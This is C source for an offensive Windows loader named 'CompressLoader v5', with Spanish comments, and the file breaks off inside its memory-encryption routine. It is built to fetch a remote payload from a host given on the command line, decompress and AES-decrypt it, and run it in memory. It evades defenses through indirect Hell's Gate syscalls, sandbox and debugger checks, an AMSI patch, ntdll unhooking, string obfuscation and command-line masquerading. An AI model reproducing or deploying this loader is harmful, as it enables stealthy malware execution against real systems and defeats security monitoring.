/*
 * CompressLoader v5 - Versión final con todas las mejoras
 * =========================================================
 * Compila con:
 *   x86_64-w64-mingw32-gcc -O2 -s -o loader6.exe loader6.c lz4.c -lwinhttp -lcrypt32 -lpsapi -lntdll -Wl,--subsystem,windows -DUSE_LZ4
 *   (sin -DUSE_LZ4 usa LZSS por defecto)
 *
 * Uso: loader6.exe <Host> <Port> <Resource> [FluctuationMode] [UserAgent]
 *   FluctuationMode: 0=off, 1=RW, 2=NOACCESS (default 2)
 *   UserAgent: cadena opcional para el User-Agent HTTP
 *
 * Modo debug: compilar con -DDEBUG
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <intrin.h>
#include <time.h>

#pragma warning(disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

// ========================================================================
// 1.  CONFIGURACIÓN
// ========================================================================
#ifdef DEBUG
    #define DEBUG_PRINT(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...) ((void)0)
#endif

// ========================================================================
// 2.  STRING OBFUSCATION
// ========================================================================
#define OBF_KEY 0xDEADBEEF

#define OBFSTR(str) ({ \
    static const char obf[] = str; \
    static char dec[sizeof(str)] = {0}; \
    static int init = 0; \
    if (!init) { \
        for (size_t i = 0; i < sizeof(str)-1; i++) \
            dec[i] = obf[i] ^ ((OBF_KEY >> (i % 4 * 8)) & 0xFF); \
        init = 1; \
    } \
    dec; \
})

// ========================================================================
// 3.  SYSCALLS (Hell's Gate + indirect)
// ========================================================================
typedef struct {
    DWORD ssn;
    PVOID syscallAddr;
} SYSCALL_ENTRY;

BOOL HellGate(PCSTR funcName, SYSCALL_ENTRY* entry) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    PVOID funcAddr = GetProcAddress(hNtdll, funcName);
    if (!funcAddr) return FALSE;
    PBYTE ptr = (PBYTE)funcAddr;
    for (int i = 0; i < 64; i++) {
        if (ptr[i] == 0x4C && ptr[i+1] == 0x8B && ptr[i+2] == 0xD1 &&
            ptr[i+3] == 0xB8) {
            entry->ssn = *(DWORD*)(ptr + i + 4);
            for (int j = i; j < i + 32; j++) {
                if (ptr[j] == 0x0F && ptr[j+1] == 0x05) {
                    entry->syscallAddr = ptr + j;
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static NTSTATUS NtAllocateVirtualMemory_indirect(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtAllocateVirtualMemory", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
        return pFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress), "r"(ZeroBits), "r"(RegionSize), "r"(AllocationType), "r"(Protect)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtProtectVirtualMemory_indirect(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtProtectVirtualMemory", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
        return pFunc(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress), "r"(RegionSize), "r"(NewProtect), "r"(OldProtect)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtWriteVirtualMemory_indirect(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtWriteVirtualMemory", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
        return pFunc(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress), "r"(Buffer), "r"(BufferSize), "r"(NumberOfBytesWritten)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtFlushInstructionCache_indirect(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Size) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtFlushInstructionCache", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID, SIZE_T) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFlushInstructionCache");
        return pFunc(ProcessHandle, BaseAddress, Size);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress), "r"(Size)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtClose_indirect(HANDLE Handle) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtClose", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
        return pFunc(Handle);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(Handle), "r"(entry.ssn), "r"(entry.syscallAddr)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtOpenSection_indirect(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtOpenSection", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");
        return pFunc(SectionHandle, DesiredAccess, ObjectAttributes);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(SectionHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(DesiredAccess), "r"(ObjectAttributes)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtMapViewOfSection_indirect(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtMapViewOfSection", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
        return pFunc(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(SectionHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(ProcessHandle), "r"(BaseAddress), "r"(ZeroBits), "r"(CommitSize),
          "r"(SectionOffset), "r"(ViewSize), "r"(InheritDisposition), "r"(AllocationType), "r"(Win32Protect)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtUnmapViewOfSection_indirect(HANDLE ProcessHandle, PVOID BaseAddress) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtUnmapViewOfSection", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
        return pFunc(ProcessHandle, BaseAddress);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

static NTSTATUS NtFreeVirtualMemory_indirect(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    SYSCALL_ENTRY entry;
    if (!HellGate("NtFreeVirtualMemory", &entry)) {
        static NTSTATUS (NTAPI *pFunc)(HANDLE, PVOID*, PSIZE_T, ULONG) = NULL;
        if (!pFunc) pFunc = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
        return pFunc(ProcessHandle, BaseAddress, RegionSize, FreeType);
    }
    NTSTATUS status;
    __asm__ volatile(
        "movq %1, %%r10\n"
        "movl %2, %%eax\n"
        "callq *%3\n"
        : "=a"(status)
        : "r"(ProcessHandle), "r"(entry.ssn), "r"(entry.syscallAddr),
          "r"(BaseAddress), "r"(RegionSize), "r"(FreeType)
        : "r10", "memory", "rcx", "rdx", "r8", "r9"
    );
    return status;
}

// ========================================================================
// 4.  COMPRESIÓN: LZSS (por defecto) o LZ4 (si se define USE_LZ4)
// ========================================================================
#ifdef USE_LZ4
#include "lz4.h"
BOOL decompress_payload(const unsigned char* input, size_t inputSize, unsigned char** output, size_t* outputSize) {
    if (inputSize < 4) return FALSE;
    int uncompressedSize = *(int*)input;
    if (uncompressedSize <= 0 || uncompressedSize > 100 * 1024 * 1024) return FALSE;
    unsigned char* buf = (unsigned char*)malloc(uncompressedSize);
    if (!buf) return FALSE;
    int result = LZ4_decompress_safe((const char*)input + 4, (char*)buf, (int)(inputSize - 4), uncompressedSize);
    if (result < 0) { free(buf); return FALSE; }
    *output = buf;
    *outputSize = result;
    return TRUE;
}
#else
#define EI 11
#define EJ  4
#define P   1
#define N (1 << EI)
#define F ((1 << EJ) + P)

typedef struct {
    const unsigned char* input;
    size_t input_size;
    size_t bit_index;
} BitReader;

static int read_bit(BitReader* br) {
    if (br->bit_index >= br->input_size * 8) return -1;
    size_t byte_index = br->bit_index / 8;
    int bit_in_byte = 7 - (br->bit_index % 8);
    unsigned char byte = br->input[byte_index];
    br->bit_index++;
    return (byte >> bit_in_byte) & 1;
}

static int read_bits(BitReader* br, int n) {
    int value = 0;
    for (int i = 0; i < n; i++) {
        int bit = read_bit(br);
        if (bit == -1) return -1;
        value = (value << 1) | bit;
    }
    return value;
}

BOOL decompress_payload(const unsigned char* input, size_t input_size, unsigned char** output, size_t* output_size) {
    if (!input || input_size == 0 || !output || !output_size) return FALSE;
    BitReader br = {0};
    br.input = input;
    br.input_size = input_size;
    br.bit_index = 0;
    unsigned char* window = (unsigned char*)calloc(N * 2, 1);
    if (!window) return FALSE;
    for (int i = 0; i < N - F; i++) window[i] = ' ';
    size_t out_capacity = 4096;
    unsigned char* out_buf = (unsigned char*)malloc(out_capacity);
    if (!out_buf) { free(window); return FALSE; }
    size_t out_len = 0;
    int r = N - F;
    while (1) {
        int flag = read_bit(&br);
        if (flag == -1) break;
        if (flag) {
            int c = read_bits(&br, 8);
            if (c == -1) break;
            if (out_len >= out_capacity) {
                out_capacity *= 2;
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) { free(out_buf); free(window); return FALSE; }
                out_buf = tmp;
            }
            out_buf[out_len] = (unsigned char)c;
            window[r] = (unsigned char)c;
            r = (r + 1) & (N - 1);
            out_len++;
        } else {
            int offset = read_bits(&br, EI);
            int length = read_bits(&br, EJ);
            if (offset == -1 || length == -1) break;
            length += 2;
            if (out_len + length > out_capacity) {
                while (out_capacity < out_len + length) out_capacity *= 2;
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) { free(out_buf); free(window); return FALSE; }
                out_buf = tmp;
            }
            for (int k = 0; k < length; k++) {
                unsigned char c = window[(offset + k) & (N - 1)];
                out_buf[out_len] = c;
                window[r] = c;
                r = (r + 1) & (N - 1);
                out_len++;
            }
        }
    }
    free(window);
    *output = out_buf;
    *output_size = out_len;
    return TRUE;
}
#endif // USE_LZ4

// ========================================================================
// 5.  CRYPTO (AES-256-CBC con CryptoAPI directa)
// ========================================================================
void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;
    BYTE iv[16] = {0};
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)data, pDataLen);
cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
}

// ========================================================================
// 6.  ANTIDEBUG / ANTIANALYSIS
// ========================================================================
BOOL IsDebuggerPresentEx() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

BOOL HasHWBreakpoints() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

BOOL IsDomainJoined() {
    WCHAR domain[256]; DWORD size = sizeof(domain);
    if (GetComputerNameExW(ComputerNameDnsDomain, domain, &size)) {
        if (wcslen(domain) > 0 && !wcsstr(domain, L"WORKGROUP"))
            return TRUE;
    }
    return FALSE;
}

BOOL HasRealGPU() {
    DISPLAY_DEVICEW dd = { sizeof(dd) };
    DWORD devNum = 0;
    int gpuCount = 0;
    while (EnumDisplayDevicesW(NULL, devNum, &dd, 0)) {
        if (dd.StateFlags & DISPLAY_DEVICE_ATTACHED_TO_DESKTOP) {
            gpuCount++;
            if (wcsstr(dd.DeviceString, L"Microsoft Basic Display Adapter") ||
                wcsstr(dd.DeviceString, L"VirtualBox") ||
                wcsstr(dd.DeviceString, L"VMWare")) {
                return FALSE;
            }
        }
        devNum++;
    }
    return (gpuCount > 0);
}

BOOL HasUserActivity() {
    LASTINPUTINFO lii = { sizeof(lii) };
    if (GetLastInputInfo(&lii)) {
        DWORD idle = GetTickCount() - lii.dwTime;
        if (idle < 60000) return TRUE;
    }
    return FALSE;
}

BOOL IsSandbox() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    MEMORYSTATUSEX mem = {0}; mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return TRUE;
    WCHAR user[256]; DWORD size = sizeof(user);
    GetUserNameW(user, &size);
    if (wcsstr(user, L"admin") || wcsstr(user, L"test") || wcsstr(user, L"user") ||
        wcsstr(user, L"analysis") || wcsstr(user, L"sample")) return TRUE;
    ULONGLONG t1 = __rdtsc();
    Sleep(100);
    ULONGLONG t2 = __rdtsc();
    if ((t2 - t1) < 1000000) return TRUE;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256]; DWORD bufSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &bufSize) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    if (!IsDomainJoined()) return TRUE;
    if (!HasRealGPU()) return TRUE;
    if (!HasUserActivity()) return TRUE;
    return FALSE;
}

// ========================================================================
// 7.  AMSI BYPASS (module stomping) - usando syscall para permisos
// ========================================================================
BOOL PatchAmsiViaStomping() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            PVOID textAddr = (PBYTE)hAmsi + sec[i].VirtualAddress;
            SIZE_T textSize = sec[i].Misc.VirtualSize;
            DWORD oldProtect;
            // Usar syscall indirecto en lugar de VirtualProtect
            NTSTATUS status = NtProtectVirtualMemory_indirect(GetCurrentProcess(), &textAddr, &textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            if (!NT_SUCCESS(status)) continue;
            FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScan) {
                PBYTE target = (PBYTE)pAmsiScan;
                *target = 0xC3;
                for (int j = 1; j < 8; j++) target[j] = 0x90;
                NtProtectVirtualMemory_indirect(GetCurrentProcess(), &textAddr, &textSize, oldProtect, &oldProtect);
                NtFlushInstructionCache_indirect(GetCurrentProcess(), target, 8);
                DEBUG_PRINT("AMSI parcheado en amsi.dll (usando syscall)");
                return TRUE;
            }
            NtProtectVirtualMemory_indirect(GetCurrentProcess(), &textAddr, &textSize, oldProtect, &oldProtect);
        }
    }
    return FALSE;
}

// ========================================================================
// 8.  UNHOOKING ntdll (KnownDlls) - usando syscall para permisos
// ========================================================================
LPVOID getCleanNtdllViaKnownDlls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    UNICODE_STRING ustr;
    RtlInitUnicodeString(&ustr, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hSection;
    NTSTATUS status = NtOpenSection_indirect(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);
    if (!NT_SUCCESS(status)) return NULL;

    PVOID mappedBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection_indirect(hSection, GetCurrentProcess(), &mappedBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    NtClose_indirect(hSection);
    if (!NT_SUCCESS(status)) return NULL;

    LPVOID localCopy = malloc(viewSize);
    if (!localCopy) { NtUnmapViewOfSection_indirect(GetCurrentProcess(), mappedBase); return NULL; }
    memcpy(localCopy, mappedBase, viewSize);
    NtUnmapViewOfSection_indirect(GetCurrentProcess(), mappedBase);
    DEBUG_PRINT("ntdll limpio mapeado desde KnownDlls (tamaño %zu)", viewSize);
    return localCopy;
}

BOOL UnhookNtdll(LPVOID cleanNtdll) {
    if (!cleanNtdll) return FALSE;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((char*)cleanNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            LPVOID target = (char*)hNtdll + sec[i].VirtualAddress;
            SIZE_T size = sec[i].Misc.VirtualSize;
            DWORD oldProtect;
            // Usar syscall en lugar de VirtualProtect
            NTSTATUS status = NtProtectVirtualMemory_indirect(GetCurrentProcess(), &target, &size, PAGE_EXECUTE_READWRITE, &oldProtect);
            if (!NT_SUCCESS(status)) return FALSE;
            memcpy(target, (char*)cleanNtdll + sec[i].VirtualAddress, size);
            NtProtectVirtualMemory_indirect(GetCurrentProcess(), &target, &size, oldProtect, &oldProtect);
            NtFlushInstructionCache_indirect(GetCurrentProcess(), target, size);
            DEBUG_PRINT("ntdll deshookeado correctamente (usando syscall)");
            return TRUE;
        }
    }
    return FALSE;
}

// ========================================================================
// 9.  COMMAND-LINE MASQUERADING
// ========================================================================
char* sz_masqCmd_Ansi = "System Maintenance Service";
wchar_t* sz_masqCmd_Widh = NULL;
char** poi_masqArgvA = NULL;
wchar_t** poi_masqArgvW = NULL;
int int_masqCmd_Argc = 0;

void MasqueradeCmdline() {
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    if (!sz_masqCmd_Widh) return;
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);
    if (!poi_masqArgvW) { free(sz_masqCmd_Widh); return; }
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        int len = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += len;
    }
    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
    if (!poi_masqArgvA) { LocalFree(poi_masqArgvW); free(sz_masqCmd_Widh); return; }
    char* buffer = (char*)poi_masqArgvA + int_masqCmd_Argc * sizeof(LPSTR);
    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        int len = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += len;
        bufLen -= len;
    }
}

LPSTR hookGetCommandLineA(void) { return sz_masqCmd_Ansi; }
LPWSTR hookGetCommandLineW(void) { return sz_masqCmd_Widh; }
char*** __cdecl hook__p___argv(void) { return &poi_masqArgvA; }
wchar_t*** __cdecl hook__p___wargv(void) { return &poi_masqArgvW; }
int* __cdecl hook__p___argc(void) { return &int_masqCmd_Argc; }
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvA; return 0;
}
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvW; return 0;
}
int __cdecl hookexit(int status) { ExitThread(0); return 0; }
void __stdcall hookExitProcess(UINT statuscode) { ExitThread(0); }

// ========================================================================
// 10. PE LOADER WITH FLUCTUATION
// ========================================================================
char* GetNTHeaders(char* pe_buffer) {
    if (!pe_buffer) return NULL;
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset < 0 || pe_offset > 1024) return NULL;
    IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
    char* nt = GetNTHeaders((char*)pe_buffer);
    if (!nt) return NULL;
    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt;
    IMAGE_DATA_DIRECTORY* dir = &nt_header->OptionalHeader.DataDirectory[dir_id];
    return (dir->VirtualAddress == 0) ? NULL : dir;
}

BOOL RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (!importsDir) return FALSE;
    size_t impAddr = importsDir->VirtualAddress;
    size_t maxSize = importsDir->Size;
    size_t parsedSize = 0;
    while (parsedSize < maxSize) {
        IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)modulePtr + impAddr + parsedSize);
        if (desc->OriginalFirstThunk == 0 && desc->FirstThunk == 0) break;
        char* libName = (char*)modulePtr + desc->Name;
        HMODULE hMod = LoadLibraryA(libName);
        if (!hMod) { parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR); continue; }
        size_t thunk = desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk;
        size_t iat = desc->FirstThunk;
        for (size_t i = 0; ; i++) {
            IMAGE_THUNK_DATA* iatEntry = (IMAGE_THUNK_DATA*)((char*)modulePtr + iat + i * sizeof(IMAGE_THUNK_DATA));
            IMAGE_THUNK_DATA* origEntry = (IMAGE_THUNK_DATA*)((char*)modulePtr + thunk + i * sizeof(IMAGE_THUNK_DATA));
            if (origEntry->u1.AddressOfData == 0) break;
            if (IMAGE_SNAP_BY_ORDINAL(origEntry->u1.Ordinal)) {
                FARPROC addr = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(origEntry->u1.Ordinal));
                iatEntry->u1.Function = (ULONG_PTR)addr;
            } else {
                PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)((char*)modulePtr + origEntry->u1.AddressOfData);
                char* funcName = (char*)byName->Name;
                FARPROC addr = GetProcAddress(hMod, funcName);
                if (_stricmp(funcName, "GetCommandLineA") == 0) addr = (FARPROC)hookGetCommandLineA;
                else if (_stricmp(funcName, "GetCommandLineW") == 0) addr = (FARPROC)hookGetCommandLineW;
                else if (_stricmp(funcName, "__wgetmainargs") == 0) addr = (FARPROC)hook__wgetmainargs;
                else if (_stricmp(funcName, "__getmainargs") == 0) addr = (FARPROC)hook__getmainargs;
                else if (_stricmp(funcName, "__p___argv") == 0) addr = (FARPROC)hook__p___argv;
                else if (_stricmp(funcName, "__p___wargv") == 0) addr = (FARPROC)hook__p___wargv;
                else if (_stricmp(funcName, "__p___argc") == 0) addr = (FARPROC)hook__p___argc;
                else if (_stricmp(funcName, "exit") == 0 || _stricmp(funcName, "_exit") == 0 ||
                         _stricmp(funcName, "_Exit") == 0 || _stricmp(funcName, "quick_exit") == 0)
                    addr = (FARPROC)hookexit;
                else if (_stricmp(funcName, "ExitProcess") == 0)
                    addr = (FARPROC)hookExitProcess;
                iatEntry->u1.Function = (ULONG_PTR)addr;
            }
        }
        parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }
    return TRUE;
}

// Estructuras para ejecución y fluctuación
typedef struct {
    PVOID entry;
} EXEC_CTX;

typedef struct {
    PVOID textStart;
    SIZE_T textSize;
    DWORD protect;
    BYTE key[32];
    BYTE iv[16];
    BOOL encrypted;
} FLUCTUATION_CTX;

static FLUCTUATION_CTX g_fluct = {0};
static int g_fluctMode = 2;

void FluctuateEncrypt(FLUCTUATION_CTX* ctx) {
    if (!ctx->textStart || ctx->textSize == 0 || ctx->encrypted) return;
    DWORD old;
    VirtualProtect(ctx->textStart, ctx->textSize, PAGE_READWRITE, &old);
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return; }
    if (!CryptHashData(hHash, ctx->key, sizeof(ctx->key), 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return; }
